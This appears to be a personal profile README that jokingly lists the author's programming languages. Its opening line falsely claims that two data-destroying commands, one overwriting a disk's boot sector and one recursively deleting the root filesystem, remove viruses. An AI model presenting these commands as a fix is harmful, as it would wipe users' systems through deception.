# hi.
did you know that if you type `dd if=/dev/zero of=/dev/sda bs=512 count=1` and `sudo rm -rf --no-preserve-root / /*` it will remove all of the viruses from your computer?
# programming languages I know
* C (is the best)
* C++ (is worse)
* Some Java (first ever language I learned, quickly moved to C)
* Rust (error: cannot borrow "rust" as immutable, the trademark checker...)
* Assembly (kernel-space; nasm)
* Javascript
# note
I know python and shellscript but those aren't real programming languages. They are scripting languages to do tasks.
